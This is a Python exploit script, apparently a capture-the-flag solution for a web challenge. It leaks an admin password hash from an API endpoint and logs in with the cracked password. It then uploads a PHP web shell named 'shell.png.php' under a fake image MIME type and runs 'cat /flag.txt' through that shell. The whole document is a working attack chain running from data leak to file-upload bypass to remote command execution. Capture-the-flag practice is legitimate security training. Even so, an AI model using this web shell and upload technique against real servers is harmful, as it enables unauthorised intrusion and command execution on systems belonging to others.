#!/usr/bin/env python
import requests
import json
import hashlib
import re

BASE_URL = "http://srv3.martiansonly.net:1111"

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})

# Get admin data, including hashed password
print("Getting admin data...")
resp = s.post(BASE_URL + "/api.php", data={"id": 13})
admin_data = json.loads(resp.text)[0]
username = admin_data["username"]
hashed_password = admin_data["password"]

print("Username:", username)
print("Hashed password", hashed_password)

# Crack the password using crackstation.net
# the password is "superraccoon"
password = "superraccoon"
assert hashlib.sha256(password.encode()).hexdigest() == hashed_password

print("Password:", password)

# Log in as admin
print("Logging in as admin...")
resp = s.post(
    BASE_URL + "/login.php",
    data={"username": username, "password": password},
    allow_redirects=False,
)

id = resp.headers["Location"].split("&")[0].split("=")[1]
token = resp.headers["Location"].split("&")[1].split("=")[1]
print("ID:", id)
print("Token:", token)

# Upload a webshell
print("Uploading a webshell...")
shell = "<?php system($_GET['cmd']); ?>"
filename = "shell.png.php"
filetype = "image/png"
name = "fileToUpload"
resp = s.post(
    BASE_URL + f"/upload.php?id={id}&token={token}",
    files={name: (filename, shell, filetype)},
)

shell_url = re.findall(r"The file (.*) has been", resp.text)[0]

print("Shell URL:", shell_url)

# Cat the flag
print("Getting the flag...")
resp = s.get(BASE_URL + f"/uploads/{shell_url}?cmd=cat /flag.txt")
flag = re.findall(r"shctf{.*}", resp.text)[0]
print("Flag:", flag)
